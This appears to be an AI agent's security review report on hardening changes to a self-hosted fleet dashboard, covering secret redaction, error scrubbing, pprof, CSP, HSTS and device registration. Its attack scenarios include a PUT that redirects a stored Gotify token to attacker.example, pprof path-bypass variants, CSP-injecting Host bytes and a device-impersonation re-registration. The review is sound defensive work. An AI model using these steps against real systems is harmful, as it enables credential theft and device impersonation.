# Security Review Report

**Story ID:** HARDEN-002
**Reviewer:** Security Researcher Agent
**Date:** 2026-10-17
**Verdict:** APPROVE WITH CONDITIONS

No CRITICAL findings. There is one HIGH finding, **SEC-001**. Its resolution is a registry
and scrubbing rule, not a change to the architecture. Credentials embedded in URL userinfo
(`https://user:pass@host`) escape the design twice. First, the secret registry treats
`server_url` (ntfy, gotify) as non-secret, so such a URL comes back verbatim from the list API.
Second, the error scrubber's variant set does not include the string Go's `net/http` actually
writes into `url.Error`: `user:***@`, not `url.URL.Redacted()`'s `user:xxxxx@`. The URL is
also `%q`-quoted. So a userinfo-bearing webhook URL leaks its path token through test-send
responses, `notification_log`, and the server log.

The other focus areas hold up against the code:
- **pprof.** No unauthenticated path remains on the main router. Both `http.Server`
  constructions set a non-nil `Handler`, so the pprof handlers that the `net/http/pprof`
  import registers on `DefaultServeMux` are never served. Path variants fall through to the SPA
  rather than pprof.
- **CSP.** Host reflection is safe under `validCSPHost`.
- **HSTS.** Reuses the trusted-proxy scheme resolver.
- **Registration key.** The constant-time digest compare is correct.
- **Health endpoints.** Disclose only booleans and a timestamp.
- **Retry queue.** Removing it (Option B) shrinks the attack surface.

Documents and code read in full:
- `docs/requirements/HARDEN-002-frd.md` and `docs/architecture/HARDEN-002-add.md`
- `internal/server/router.go`, `server.go` and `config.go`
- `internal/server/middleware/` `clientip.go`, `setup.go`, `cors.go` and `logger.go`
- `internal/server/handlers/handlers.go` (`Health`, `RegisterDevice`, `GetRegistrationKey`)
- `internal/server/handlers/settings.go`, plus the cookie sites in `auth.go` and `oidc.go`
- `internal/server/notify/dispatcher.go` and all eight backends
- `internal/server/db/notify_repo.go`, `admin_repo.go` and `device_repo.go` (`StoreAPIKey`)
- `internal/resilient/retry_queue.go`
- `web/index.html`, `web/vite.config.ts`, `web/src/pages/settings/NotificationSettings.tsx`
  and `web/src/pages/Login.tsx`

---

## Threat Model Summary

### Assets

| Asset | Where it lives | Why it matters |
|---|---|---|
| Notification credentials: SMTP password, Telegram bot token, Discord/Slack webhook URLs, ntfy token and topic, Pushover tokens, Gotify app token, webhook URL and header values, and **credentials embedded in any config URL** | `notification_channels.config` (plaintext JSONB), API responses, `notification_log.error_msg`, the slog DB log store | They are credentials for services outside the homelab, such as the operator's mail account. They pivot off-platform. |
| Process internals: heap, goroutine stacks, `cmdline`, CPU profiles and traces | Go runtime, served by pprof | Reconnaissance, plus a resource-exhaustion vector (30 s profiles and traces) |
| The admin dashboard UI | Embedded SPA on `:7331` | It has remote-command and terminal capability across the fleet, so clickjacking and script injection are high-impact |
| The device registration key | `admin_config.registration_key` | Gates who can enroll devices and obtain device API keys |
| Health signal integrity | `/health`, `/readyz` | Monitors must not see "healthy" while the DB is down |

### Threat Actors

1. **Unauthenticated LAN attacker** reaching `0.0.0.0:7331` (LAN, direct
   TLS, no proxy). Wants pprof data, a timing oracle on the registration key, or health-state
   reconnaissance.
2. **Passive reader of admin responses.** This means browser cache, devtools, screenshots, a
   response-logging intermediary, or a read-only XSS. It is the actor the FRD's F-3 is
   written against ("session thief reading API responses").
3. **Active holder of an admin session** (stolen cookie or full XSS). This actor can write.
   Note that it already holds fleet-wide command execution and container terminals.
4. **Malicious web page** trying to frame the dashboard or ride the session.
5. **Remote notification endpoint** whose error responses end up in rIOt's logs.

### Attack Surface Introduced

- An opt-in loopback pprof listener (`RIOT_PPROF_ADDR`).
- A new public `GET /readyz`, and a status-code change on public `GET /health`. Both run a DB
  probe per unauthenticated request.
- A `Host`-header-derived fragment inside the `Content-Security-Policy` header.
- The write-only secret contract: the sentinel `[rIOt-redacted]`, merge-on-PUT, and
  `MergeSecrets` / `RedactChannel` / `ScrubSecrets`.
- A new PUT 404 branch.
- `SecretInput`, a secret field that now renders **empty** while a secret is stored.

Attack surface **removed**:
- The unauthenticated `/debug/pprof` mount on the main listener.
- The dead retry queue, which would have persisted secret-bearing URLs to disk if it had ever
  been wired.

---

## Focus-area verification (against code at `a7b9f9e`)

### pprof

- **Main router, no unauthenticated path.**
  - After AD-001 the main chi mux has no pprof handler anywhere. The only routes are
    explicit 404s at `/debug/pprof` and `/debug/pprof/*`.
  - Variants go to `serveFrontend`, which returns `index.html` with 200. That is not profile
    data. The variants checked:
    - case variants (`/DEBUG/PPROF/`)
    - doubled slashes (`//debug/pprof/`, `/debug//pprof/`)
    - dot segments
    - encoded separators. chi routes on `RawPath` when it is set, so `/debug%2Fpprof/heap`
      does not match the 404 route either.
  - chi does not clean paths unless `middleware.CleanPath` is installed, and it is not. The
    Go server does not clean paths either, because only `ServeMux` does that.
  - `FrontendFS.Open` rejects `..` through `fs.ValidPath`, so the catch-all cannot be turned
    into a traversal.
  - Conclusion: only the canonical paths are 404. Every other variant is a 200 SPA page with
    no pprof content. That is safe. The cosmetic inconsistency is covered by condition C5.
- **DefaultServeMux.**
  - `import _ "net/http/pprof"` (kept in the new `pprof.go`) registers `/debug/pprof/*` on
    `http.DefaultServeMux` in `init`.
  - Both `http.Server` literals set `Handler`: `server.go:199` (`router`) and
    `server.go:400` (`s.router`). There is no `http.ListenAndServe(addr, nil)` and no
    `http.Serve` in the tree.
  - autocert uses TLS-ALPN on the main listener. There is no `HTTPHandler(nil)` port-80
    listener.
  - So DefaultServeMux is never served. This is load-bearing and is pinned by condition C5.
- **Loopback parsing (AD-002, `netip`):**

  | Input | Result | Reason |
  |---|---|---|
  | `:6060` | rejected | `ParseAddr("")` errors |
  | `0.0.0.0:6060` | rejected | `Is4()` but not loopback |
  | `[::]:6060` | rejected | not `IPv6Loopback()` |
  | `[::1%lo]:6060` | rejected | the explicit zone check |
  | `[::ffff:127.0.0.1]:6060` | rejected | `Is4()` is false for 4-in-6, and it is not `IPv6Loopback()` |
  | `127.1:6060`, `0177.0.0.1:6060`, `localhost:6060` | rejected | `netip` refuses shorthand, octal and hostnames |

  Caution on the `[::ffff:127.0.0.1]` case: `netip.Addr.IsLoopback()` unmaps 4-in-6. An
  implementer who "simplifies" the check to `a.IsLoopback()` would accept it. That is still a
  loopback bind, so it is safe either way, but the documented behavior must be pinned by a
  test (C5).
- **Container posture.**
  - With bridge networking and `ports: 0.0.0.0:7331`, the container's `127.0.0.1` cannot be
    reached through Docker port mappings, so `docker exec` is required.
  - If riot-server ever moves to `network_mode: host`, the listener binds the **host**
    loopback. Any local user or host-network container could then read profiles and start
    30 s CPU profiles or traces.
  - This is accepted because the listener is opt-in and default-off. It is recorded in LOW
    SEC-007.

### CSP and the Host-derived `connect-src`

- **Injection.**
  - Go's `httpguts.ValidHostHeader` accepts sub-delims (`;`, `,`, `'`, `*`, `!`, `$`, `&`,
    `(`, `)`, `+`, `=`).
  - `validCSPHost` restricts the value to `[A-Za-z0-9.\-:\[\]]` and 1 to 262 bytes. That
    excludes:
    - `;`, which starts a new directive
    - `,`, which starts a second policy
    - whitespace, which starts a new source expression
    - `'`, which starts a keyword such as `'unsafe-inline'`
    - `*`, a wildcard
  - A spoofed Host therefore cannot add directives, add sources, or form a wildcard.
  - Malformed values (`a:b:c`, `[x`) produce an invalid host-source. Browsers drop invalid
    sources rather than widening the policy.
  - Empty Host (HTTP/1.0) and `%`-zoned IPv6 fall back to `connect-src 'self'`.
- **Harm when the attacker controls only their own request: none.**
  - The CSP is delivered only to whoever sent that Host. There is no shared cache in the path
    (no proxy, and no `Cache-Control: public` on the SPA). So the reflection cannot poison
    another user.
  - Under DNS rebinding, the document origin *is* the attacker's hostname, so
    `ws://<thatHost>` is exactly `'self'` and grants nothing more.
  - Pinned by C6.
- **`style-src 'unsafe-inline'`.** This is a contained residual. CSS cannot fetch off-origin,
  because `img-src` and `font-src` are `'self' data:` and `@import` is governed by
  `style-src 'self'`. Attribute-selector exfiltration to a third party is therefore blocked.
  What remains is in-page UI redressing, which needs an HTML injection that React escaping
  prevents. There is no `dangerouslySetInnerHTML` in `web/src`.
- **Directives.**
  - `object-src 'none'`, `base-uri 'self'` and `frame-ancestors 'none'` are present.
  - `worker-src` falls back to `script-src 'self'`.
  - `frame-src`, `media-src` and `manifest-src` fall back to `default-src 'self'`.
  - `form-action` is omitted under D-08 and FR-010. The D-08 rationale is already resolved
    in code: the SSO entry is an anchor **outside** the login form (`Login.tsx:175`, pinned by
    `Login.test.tsx:73`). See LOW SEC-008.
- **`web/index.html`** has no inline script or style, and `vite.config.ts` uses only `react()`
  and `tailwindcss()`. `script-src 'self'` will hold, subject to the post-deploy devtools
  check in ADD §13.
- **HSTS gate.**
  - `IsHTTPS(r)` is `RequestScheme(r) == "https"`.
  - `RequestScheme` honors `X-Forwarded-Proto` **only** from the context value that `RealIP`
    sets after `tp.trusts(peerAddr)`. Otherwise it uses `r.TLS != nil`.
  - `SecurityHeaders` runs directly after `RealIP`, and the four cookie sites switch to the
    same function, so the trusted-proxy logic is reused and not duplicated.
  - An untrusted peer's `X-Forwarded-Proto: https` is ignored, as is its `X-Forwarded-Proto:
    http` (which could otherwise suppress HSTS).
  - Deploy assumption: `RIOT_TRUSTED_PROXIES` stays unset when there is no proxy (C7).

### Secret redaction and merge

- **Registry against backend reads.** Every key read by each backend:

  | Backend | Keys read |
  |---|---|
  | smtp | `host`, `port`, `username`, `password`, `from`, `to`, `starttls` |
  | ntfy | `server_url`, `topic`, `token`, `priority`, `priority_map` |
  | telegram | `bot_token` (URL path), `chat_id` |
  | discord, slack | `webhook_url` |
  | pushover | `api_token`, `user_key` (form body) |
  | gotify | `server_url`, `app_token` (raw in the query string) |
  | webhook | `url`, `headers` |

  T-1 covers every *dedicated* secret key. **Gap:** a URL-valued non-secret key can carry
  credentials in userinfo. This is SEC-001.
- **Type change.** AD-007 inherits nothing when `type` changes, so a Discord webhook URL cannot
  be silently reused as a Slack target. The sentinel resolves to `""`, so FR-024 holds.
- **Sentinel never persisted.**
  - The merge resolves every registry key.
  - The final sweep covers the top level and one nested level.
  - Arrays and deeper nesting are not swept (LOW SEC-009). There is no security impact,
    because a sentinel inside a non-secret array is inert.
- **Responses.**
  - List, Create and Update all pass through `RedactChannel` over a deep copy.
  - Error responses are fixed literals.
  - No other serializer of `NotificationChannel` exists. The checked consumers of
    `notifyRepo` are `settings.go`, `dispatcher.go`, `server.go` and
    `server_error_alert_worker.go`, and none emits config.
  - `middleware.Logger` logs only method, path, status, duration and remote address. It never
    logs bodies or query strings.
- **Error scrubbing.**
  - The single choke point after `backend.Send` is the right design.
  - The scrubbed error deliberately has no `Unwrap`.
  - The variant set misses the userinfo form and the `%q` form that `url.Error` uses.
  - This is SEC-001(b).
- **Write-only against an active writer.** It does not hold against an actor who can write:
  that actor can re-point the destination and keep the secret. This is SEC-002 (MEDIUM). It is
  outside the FRD's "reading API responses" actor, and it is moot in practice, because an admin
  session already reaches the plaintext through the fleet container terminal.

### Registration key

AD-010 compares `subtle.ConstantTimeCompare(sha256(provided), sha256(configured))` over fixed
32-byte digests. That removes both the content leak and the length leak. SHA-256 run time
varies only by 64-byte block count, which is negligible next to the `GetConfig` round trip,
and the 10/min limiter remains. The fix is correct. The surrounding function has
pre-existing issues, recorded as P-1 and P-2 below. They do not block this story.

### `/health` and `/readyz`

The bodies are fixed structs: status word, booleans and an RFC 3339 timestamp. The probe
returns only a bool, so no DSN, host, error text or version can leak (AD-011, AC-052). What
remains disclosed to the unauthenticated LAN is "DB up or down" and the server clock. Both
are acceptable. Each request still triggers one `Pool.Ping`, which is pre-existing; see LOW
SEC-006.

### Retry queue removal (Option B)

Confirmed:
- `RetryQueue` and `QueuedNotification` are referenced only inside
  `internal/resilient/retry_queue.go`.
- The queue was never wired, so no on-disk file holding secret URLs was ever written in
  production.
- `dns_cache.go` and `http_client.go` are independent.

Deleting it removes a latent secrets-at-rest sink (`os.WriteFile` of `{URL, payload}`) and a
mutex-held-across-network-I/O hazard. This is a net security improvement.

---

## Findings

### CRITICAL

None.

---

### HIGH

#### SEC-001: URL-embedded credentials escape both redaction and error scrubbing

**Severity:** HIGH
**Domain:** Data Exposure / Secrets
**Location:** ADD AD-006 (T-1 registry), AD-007 (`RedactChannel`), AD-008 (`ScrubSecrets`
variant set); `notify/ntfy.go`, `notify/gotify.go` (`server_url`); every URL-based backend's
`httpClient.Do` error path.

**Description:**

(a) **Response leak.**
- The ntfy backend authenticates only with `Authorization: Bearer <token>`. An operator whose
  self-hosted ntfy uses username and password, or whose Gotify sits behind basic auth, will
  naturally configure `server_url: https://alice:S3cret@ntfy.home`.
- That configuration works, because Go's `http.Client.send` turns URL userinfo into a Basic
  `Authorization` header automatically.
- `server_url` is classified **non-secret** in T-1 and FR-022, so `RedactChannel` returns it
  verbatim.
- The password therefore comes back in cleartext from `GET /notification-channels`, which is
  exactly the F-3 exposure this story exists to close. It also violates NFR-002 and I-3.

(b) **Error-text leak.**
- When `http.Client.Do` fails, the error is a `*url.Error`. `url.Error.Error()` is
  `fmt.Sprintf("%s %q: %s", Op, URL, Err)`.
- `URL` is `net/http`'s `stripPassword(req.URL)`, which rewrites userinfo as
  `user:***@`.
- AD-008's variants are:
  - `v`
  - `PathEscape(v)`
  - `QueryEscape(v)`
  - `u.String()`
  - `u.Redacted()`. This produces `user:xxxxx@`, **not** `***`.
- So for a webhook, Discord or Slack URL that contains userinfo, **no variant matches**, and
  the rest of the URL is written out unscrubbed. That includes path tokens such as
  `/api/webhooks/1/TOK` or `https://n8n.home/webhook/<id>`.
- The `%q` quoting also means any secret containing `"` or `\`, or non-printable bytes,
  appears in an escaped form that no variant matches. This is unlikely for current
  token alphabets, but it is the general case.

**Attack Scenario:**
1. The operator configures a webhook channel `https://riot:pw@n8n.home/webhook/7f3c…` (or an ntfy
   channel with a userinfo `server_url`).
2. (a) Any passive reader of an admin response, such as a devtools HAR export, a browser
   cache entry or an XSS that reads `/api/v1/settings/notification-channels`, gets
   `alice:S3cret` from the ntfy `server_url`.
3. (b) The n8n host is briefly down. `Dispatch` logs
   `webhook: send: Post "https://riot:***@n8n.home/webhook/7f3c…": dial tcp …: connection refused`.
   The webhook ID is the credential for an n8n webhook, and it is now in
   `notification_log.error_msg` (90-day retention) and in the DB server-log store, served by
   `GET /api/v1/settings/logs`. The test-send response shows it too.

**Required Resolution:**
- **Response property.** No credential carried in URL userinfo may appear in any API response.
  This applies to **any** URL-valued config key, whether or not the registry lists it as
  secret. That covers ntfy and gotify `server_url` as well as the secret URL keys. On PUT, the
  write-only merge must apply to that userinfo component, so that an untouched `server_url`
  does not lose its stored credential and the sentinel is never persisted (FR-024 and V-005
  extend to it).
- **Scrubbing property.** `ScrubSecrets` must remove every secret, including userinfo
  credentials and the remainder of any secret-classified URL, in the exact serializations Go's
  standard library emits on the failure paths these backends hit:
  - the `net/http` `stripPassword` form (`user:***@host…`)
  - the `%q`-escaped form used by `url.Error`
  - the existing raw, path-escaped and query-escaped forms
- **Verification property.** Tests must produce the error through a real `http.Client`
  failure, using a `RoundTripper` that returns an error. A hand-built error string is not
  enough. Cover each URL-based backend, with at least one secret URL that contains userinfo,
  and assert that neither the path token nor the password appears in:
  - the test-send response
  - `NotificationLog.ErrorMsg`
  - captured slog output
- The FRD's T-1 / FR-022 classification of `server_url` as "returned as-is" must be read as
  "as-is except embedded credentials". The architect records this as an AD-006/AD-007
  amendment. No new component is needed.

**Blocks:** Implementation of AD-006/AD-007/AD-008 as currently written. This is resolvable
inside the same components, so it is a condition, not a redesign.

---

### MEDIUM

#### SEC-002: Write-only secrets do not resist an actor with write access (destination rebinding)

**Severity:** MEDIUM
**Domain:** Business Logic / Secrets
**Location:** ADD AD-007 merge rules (FRD T-2 "sentinel → keep stored", "key omitted → keep
stored").

**Description:** The merge keeps a stored secret whenever the sentinel is submitted, even when
the same PUT changes the field that decides where that secret is sent. For each backend:

| Backend | Destination field changed | Secret that is kept and then sent |
|---|---|---|
| gotify | `server_url` | `app_token`, sent in the query string |
| ntfy | `server_url` | `token`, sent as a Bearer header; `topic`, sent in the path |
| smtp | `host` | `password`. PLAIN auth over STARTTLS succeeds against an attacker host that has a valid public cert. |
| webhook | `url` | every `headers` value, for example `Authorization` |

**Attack Scenario:**
1. The attacker holds an admin session (stolen cookie or full XSS).
2. `PUT /api/v1/settings/notification-channels/3` with
   `{"type":"gotify","server_url":"https://attacker.example","app_token":"[rIOt-redacted]",…}`.
3. `POST …/3/test`. rIOt sends `POST https://attacker.example/message?token=<real token>`.
4. The attacker restores the original `server_url`, which is non-secret and was visible to
   them.

**Context that limits severity:**
- The FRD's stated actor for F-3 is one *reading* API responses, and the design fully defeats
  that actor.
- An actor with an admin session already has fleet-wide command execution and container
  terminals. If an agent with Docker access runs on the server host, that
  includes the `riot-db` container, which holds these secrets in plaintext.

So this is a residual, not a regression.

**Required Resolution:**
- ADD §10 and the README "Secrets are write-only" paragraph must state the boundary
  explicitly. Write-only protects against disclosure through responses, logs and caches. It
  does not protect against an attacker who can edit channels, and it does not protect secrets
  at rest.
- The FRD/ADD must not claim protection against an active admin-session holder.
- Log a follow-up (§12.4) for destination binding. The property to achieve: a stored secret
  may only be sent to the destination it was configured with. Changing a destination-defining
  field without resubmitting the dependent secrets must be **rejected**, so it is neither
  silently kept nor silently wiped (BR-003 is preserved).

**Blocks:** Nothing. Documentation condition only.

#### SEC-003: Empty-rendered secret fields become targets for browser password-manager autofill

**Severity:** MEDIUM
**Domain:** Data Exposure / Client-side
**Location:** ADD AD-009 `SecretInput` (`masked: true` fields: smtp `password`, ntfy `token`,
telegram `bot_token`, pushover `api_token`/`user_key`, gotify `app_token`).

**Description:**
- Today the masked inputs show the stored value, so they are non-empty and autofill does not
  overwrite them.
- After this story a configured secret renders as an **empty** password-type input.
- The login form (`Login.tsx:115`, `autoComplete="on"`) causes browsers to save the operator's rIOt
  admin credentials for this origin.
- A text input followed by a password input matches the login-form heuristic in Chrome and
  Firefox. Examples are SMTP `username` then `password`, and Gotify `server_url` then
  `app_token`.
- Autofill fires `input` events, which React's `onChange` observes. So the field changes
  from "Configured (unchanged)" to the autofilled value.

**Attack Scenario (accidental disclosure, no attacker needed):**
1. The operator opens the Gotify channel to rename it.
2. Chrome autofills the saved rIOt admin password into `app_token`.
3. The operator saves. The stored Gotify token is replaced with the rIOt admin password.
4. Every later alert sends `POST https://gotify/message?token=<rIOt admin password>`. The
   password lands in the Gotify server's access logs and in any proxy log on that path, and
   notifications break.
5. For SMTP, the admin password is sent to the mail server as the PLAIN-auth password.

**Required Resolution:** Secret inputs must not be eligible for browser credential autofill
or saving. A vitest assertion on the rendered attributes must cover this, plus a post-deploy
manual check: in Chrome with a saved rIOt login, open each masked channel type and confirm
nothing is prefilled. Add this to the ADD §13 post-deploy list.

**Blocks:** Nothing. Must be verified before QA sign-off.

---

### LOW / INFORMATIONAL

#### SEC-004: HSTS is port-agnostic and pins a self-managed certificate

**Severity:** LOW
**Domain:** Infrastructure / Configuration
**Location:** ADD AD-003 and D-10.

- When rIOt is reached by IP literal (`https://<server>:7331`), browsers
  ignore HSTS for IP literals, so the header is inert.
- If the operator ever reaches rIOt by a hostname whose certificate the browser trusts, for example
  `<hostname>.lan` with the rIOt CA installed:
  - HSTS applies to **every port** on that hostname (RFC 6797 §8.3). Plain-HTTP siblings on
    the same host, such as `http://<hostname>.lan:<other-port>`, would be force-upgraded and break for a
    year.
  - Any later certificate error becomes non-bypassable for a year. Causes include a CA
    change, a SAN change through `/settings/tls/regenerate`, or TLS being disabled.

D-10 only considers subdomains. **Resolution:** the README "Security headers" paragraph must
state that HSTS covers every port on the hostname and that certificate errors become
non-bypassable once it is pinned. The operator accepts or rejects that consciously.

#### SEC-005: CSP Host-reflection tests must cover every policy-altering byte

**Severity:** LOW
**Domain:** Input Validation
**Location:** ADD AD-004 and AC-012.

The design is sound (see the verification section). AC-012 tests only `a;b`. **Resolution
(test property):** every byte Go accepts in Host that has CSP meaning must be shown to fall
back to `connect-src 'self'`: `;`, `,`, `'`, `*`, `(`, `)`, `!`, `$`, `&`, `+`, `=`, `%`,
and a 263-byte host. Pinned by C6.

#### SEC-006: Unauthenticated health probes cost one DB ping each

**Severity:** LOW
**Domain:** Rate Limiting / Availability
**Location:** ADD AD-011.

- `/health` already pinged the DB on every request. `/readyz` doubles the surface.
- A LAN flood turns into `Pool.Ping` acquisitions against `MaxConns=50`.
- During a DB hang, each request parks a goroutine for up to 2 s.
- The impact is bounded and the surface is LAN-only. FRD §9 item 5 leaves rate limiting out
  of scope.

Recommended follow-up: unauthenticated probe traffic should not map 1:1 onto DB connection
acquisitions.

#### SEC-007: pprof parser and bind hygiene

**Severity:** LOW
**Domain:** Configuration
**Location:** ADD AD-002.

- `strconv.Atoi` accepts `+6060` and `06060`. AD-002 then binds `JoinHostPort(a.String(),
  port)` using the **raw** port string, so the bound address can differ textually from what
  was validated. Binding a non-canonical port either fails or binds 6060. Neither widens the
  bind.
- The bound address should be built only from the parsed values.
- Host-network deployments make the loopback listener host-wide (see the verification
  section).

Pinned by C5.

#### SEC-008: `form-action` can be added now; D-08's blocker is already resolved

**Severity:** LOW
**Domain:** Security Headers

- The SSO entry is an `<a href="/api/v1/auth/oidc/start">` outside the login form
  (`Login.tsx:172-175`, tested at `Login.test.tsx:73`).
- The only form submissions are same-origin: the login form, GeneralSettings and Setup.
- `form-action 'self'` would therefore not block the OIDC chain.

FR-010 currently forbids it, so this belongs to follow-up F-2. The follow-up can close quickly
and needs no further investigation.

#### SEC-009: Robustness of the registry and sweep

**Severity:** LOW
**Domain:** Secrets / Maintainability

- The final sentinel sweep stops at one nested level and skips arrays.
- NFR-010's "unknown type → redact all" rule does not cover a **known** type whose backend
  starts reading a new secret key. That key would be returned verbatim until someone updates
  T-1.

Recommended: a test that enumerates every `ch.Config["…"]` key each backend reads, and fails
when a key is not classified as secret or non-secret.

#### SEC-010: Remote error bodies are stored unbounded

**Severity:** LOW (pre-existing)
**Domain:** Data Exposure / Availability

`discord.go` and `telegram.go` put `io.ReadAll(resp.Body)` into the error text. That text is
then stored in `notification_log` and the log store. Scrubbing cannot catch a provider that
echoes a transformed secret (already listed as a residual in ADD §10), and the body size is
unbounded. These endpoints are admin-configured, so this is informational.

---

## Pre-existing findings in touched code (not introduced by HARDEN-002; do not block)

The FRD freezes `RegisterDevice` (FR-034, C-1). These findings are recorded so the operator can
schedule a follow-up, alongside the ADD's F-1 (registration key readable in cleartext) and F-3
(`RIOT_API_KEY` is never enforced).

### P-1: Re-registration mints extra API keys for existing devices when registration is open (MEDIUM)

**Location:** `handlers.go:175-213`, `device_repo.go:205` (`StoreAPIKey` INSERTs; it does not
replace).

**Description:**
- With no `registration_key` set, `POST /api/v1/devices/register` with
  `{"device_id":"<existing UUID>"}` and **no** `X-rIOt-Key` header issues a **new, additional**
  API key for that existing device. The device's real key keeps working, so nothing alerts.
- In non-mTLS mode that key fully impersonates the device: heartbeat, telemetry, and
  `/ws/agent`, which receives that device's commands.
- In every mode, including with a registration key set, anyone holding the shared registration
  key can overwrite any device's hostname, tags and hardware profile.

**Precondition:** knowledge of a device UUID. UUIDs are not secret by design: they appear in
the dashboard and in agent configs.

**Recommended follow-up:**
- Re-registration of an existing device must require proof that the caller *is* that device,
  meaning its current API key or client certificate.
- Operators should check whether a `registration_key` is set and whether mTLS is enabled.

### P-2: Registration fails open on a configuration read error (LOW)

**Location:** `handlers.go:157`.

`regKey, _ := GetConfig(...)` discards the error, so any DB error reading the key is treated
as "no key", which means open registration. No reliable attacker trigger was identified, so
this is LOW. A constant-time compare next to a fail-open read is inconsistent, and the
follow-up for F-3 should make a read error fail closed.

---

## Positive Observations

- **pprof closed by construction.** The main mux has no profile handler. The explicit 404 makes
  the closure observable. Literal-IP-only parsing through `netip` rejects every widening form
  (empty host, unspecified addresses, zones, hostnames, shorthand, 4-in-6). Bind failure and
  rejection never abort startup.
- **Non-wrapping headers middleware** placed directly after `RealIP`. `Hijacker` and `Flusher`
  are untouched, every downstream response class carries the headers, and HSTS uses the
  existing trusted-proxy predicate. The four cookie sites are switched to the same function,
  so the two can never diverge.
- **No bare `ws:` / `wss:` schemes** in `connect-src`. The reflected host is validated to a
  strict byte set, which closes directive injection through Go's permissive Host grammar.
- **Fail-closed redaction.** Unknown types are fully redacted. Non-map `headers` are replaced
  wholesale. Non-string secret values are redacted. Deep copies prevent the response from
  aliasing stored state.
- **No inheritance across a type change**, a sentinel that can never be persisted, and a PUT
  that now returns 404 instead of performing a silent no-op write.
- **A single scrubbing choke point** at `backend.Send` with no `Unwrap`. It catches a fourth
  leak surface the FRD missed: the server-error-alert worker log line.
- **Digest-then-constant-time compare** removes the length leak, which a naive
  `ConstantTimeCompare` on raw strings would not.
- **Health bodies are compile-time-fixed structs over a bool-only probe**, bounded with a
  buffered channel against checkers that ignore their context. The nil-`*db.DB`-in-interface
  trap is explicitly avoided.
- **Option B removes a secrets-at-rest sink** rather than wiring it in.
- **The OQ-8 audit** (no other raw secret comparisons in `internal/server`) is consistent with
  what Clod observed: device keys and bootstrap keys are looked up by hash, the admin password
  uses bcrypt, and JWTs are verified by the library.

---

## Verdict Rationale

**APPROVE WITH CONDITIONS.**
- There are no CRITICAL findings.
- The single HIGH (SEC-001) has a clear resolution inside the components the ADD already
  creates (`notify/secrets.go`, `dispatcher.go`, `settings.go`) and needs no architectural
  change.
- SEC-002 and SEC-003 are MEDIUM and are resolved by documentation and a client-side property.

The core goals hold against the code:
- pprof is unreachable unauthenticated on `:7331` in every configuration.
- The CSP cannot be widened by a spoofed Host.
- HSTS honors only trusted proxies.
- The registration-key compare is constant-time.
- Health endpoints leak nothing beyond their documented fields.

### Conditions

senior_dev implements these and QA verifies them:

1. **C1 (SEC-001a, HIGH).** No credential in URL userinfo of **any** URL-valued config key
   (including ntfy and gotify `server_url`) appears in any list, create or update response.
   The write-only merge applies to that userinfo, so an untouched `server_url` keeps its
   stored credential and the sentinel is never persisted. The architect records this as an
   amendment to AD-006 and AD-007. Tests: a stored ntfy channel with
   `server_url: https://alice:S3cret@ntfy.home` returns no `S3cret` in the list body, and a
   name-only PUT preserves the stored credential.
2. **C2 (SEC-001b, HIGH).** `ScrubSecrets` must match the serializations Go actually emits:
   the `net/http` `stripPassword` form (`user:***@`) and the `%q`-escaped form of `url.Error`,
   in addition to the existing variants. Tests generate the error through a real `http.Client`
   with an erroring `RoundTripper`, for each URL-based backend (telegram, discord, slack,
   ntfy, gotify, webhook), including a userinfo-bearing secret URL. Assert that neither the
   path token nor the password appears in the test-send `error`, `NotificationLog.ErrorMsg`,
   or captured slog output.
3. **C3 (SEC-003, MEDIUM).** Every `SecretInput` must not be eligible for browser credential
   autofill or saving. Verify with a vitest attribute assertion, and add a manual check to the
   ADD §13 post-deploy list: Chrome with a saved rIOt login, open each masked channel type,
   and confirm nothing is prefilled.
4. **C4 (SEC-002, MEDIUM).** ADD §10 and the README "Secrets are write-only" paragraph must
   state that write-only protects against disclosure through responses, logs and caches, and
   **not** against an actor who can edit channels (destination rebinding) or against
   plaintext at rest. Log the destination-binding follow-up in ADD §12.4.
5. **C5 (pprof invariant).**
   - (a) A router test asserts that `/DEBUG/PPROF/`, `//debug/pprof/`, `/debug//pprof/heap`,
     `/debug/pprof/../debug/pprof/heap` and `/debug%2Fpprof/heap` return no pprof markers,
     whatever their status.
   - (b) A REVIEW gate: no `http.Server` in the tree has a nil `Handler`, and nothing calls
     `http.ListenAndServe(…, nil)` / `http.Serve(…, nil)` or references `http.DefaultServeMux`.
     Add it to ADD §13.
   - (c) `ParsePprofAddr` table cases add `[::ffff:127.0.0.1]:6060`, `[::1%lo]:6060`,
     `127.1:6060`, `0177.0.0.1:6060`, `127.0.0.1:+6060` and `127.0.0.1:06060`, with the
     expected outcomes pinned.
   - (d) The bound address is built only from parsed and canonicalized values.
6. **C6 (SEC-005).** The CSP test proves that a Host containing any of `;` `,` `'` `*` `(` `)`
   `!` `$` `&` `+` `=` `%`, or longer than 262 bytes, yields exactly `connect-src 'self'`.
7. **C7 (deploy check and SEC-004).**
   - The orchestrator confirms before deploy that `RIOT_TRUSTED_PROXIES` is unset in the deployment's
     riot-server environment. With no proxy, any value would let the listed peers suppress
     HSTS and `Secure` and spoof the client IP.
   - The README "Security headers" paragraph must state that HSTS applies to every port on a
     hostname and makes certificate errors non-bypassable once pinned.

Recommended, not conditions: SEC-006, SEC-008 (close F-2 by adding `form-action 'self'`),
SEC-009 and SEC-010, plus follow-ups for P-1 and P-2.

**Routing:** invoke `senior_dev` with this report alongside the ADD. The architect records the
C1/C2 amendment to AD-006/AD-007/AD-008 and the C4 text in §10/§12.4; this is an in-place
delta and needs no re-review. QA must verify C1 through C6 by test and C7 at deploy.
